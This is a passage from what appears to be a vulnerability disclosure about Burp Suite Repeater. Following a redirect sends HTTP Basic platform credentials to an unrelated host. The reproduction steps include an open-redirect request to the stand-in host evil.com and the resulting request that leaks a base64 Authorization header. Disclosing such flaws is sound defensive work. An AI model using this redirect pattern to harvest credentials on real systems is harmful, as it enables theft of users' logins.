Use HTTP Basic auth and whatever credentials.\n- Using Repeater, issue a request to the page with the open redirection:\n\n```\nGET /redirect.php?url=http://evil.com HTTP/1.1\nHost: example.com\n\n \n```\n\n- Click on the `Follow redirection` button\n- Observe, helpless, as your HTTP Basic credentials are sent to `evil.com`:\n\n```\nGET http://evil.com/ HTTP/1.1\nHost: evil.com\nAuthorization: Basic dXNlcjpwYXNz\n\n\n```\n\nNote that there's nothing \"unusual\" about the steps to reproduce this, so it can easily happen completely by accident. On the attacker's side, exploiting this only requires logging any incoming `Authorization` headers.\n\n## Impact\n\nBurp Suite users may inadvertently send Platform Authentication credentials to unrelated third parties.

Following a redirection to an absolute URL results in the entire URL being included in the first line of the generated request.
